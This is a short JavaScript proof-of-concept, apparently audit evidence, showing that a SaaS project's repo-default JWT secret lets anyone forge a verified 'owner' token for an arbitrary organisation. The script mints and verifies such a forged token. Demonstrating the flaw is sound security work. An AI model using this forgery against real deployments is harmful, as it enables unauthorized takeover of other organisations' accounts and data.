// P0 evidence: with JWT_SECRET unset (as in docker-compose.yml), the repo-default
// secret is used, so anyone can mint a valid owner token for any org.
import { TokenService } from "../src/saas/auth.js";

console.log("JWT_SECRET set in env?", !!process.env.JWT_SECRET);
const ts = new TokenService();
const forged = ts.generateToken({
  sub: "usr_evil",
  email: "evil@attacker.io",
  orgId: "org_victim",
  role: "owner"
});
const payload = await ts.verifyToken(forged);
console.log(
  "Forged owner token for org_victim VERIFIED by production TokenService:",
  JSON.stringify({ orgId: payload.orgId, role: payload.role, sub: payload.sub })
);
